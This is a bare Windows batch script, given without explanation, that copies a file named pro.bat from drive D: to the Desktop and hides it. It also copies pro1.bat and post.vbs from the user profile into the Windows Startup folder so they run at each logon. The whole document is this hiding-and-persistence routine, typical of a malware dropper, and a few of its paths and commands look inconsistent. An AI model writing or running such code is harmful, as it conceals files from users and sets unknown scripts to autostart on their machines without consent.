@echo off
set "desktop_dir=%USERPROFILE%\Desktop"
for /R "D:\" %%i in (pro.bat) do (
    copy "%%i" "%desktop_dir%"
)
attrib +h %desktop_dir%/pro.bat
for /R "%USERPROFILE%" %%i in (pro1.bat) do (
    copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)
attrib +h %desktop_dir%/pro1.bat
for /R "%USERPROFILE%" %%i in (post.vbs) do (
    copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)
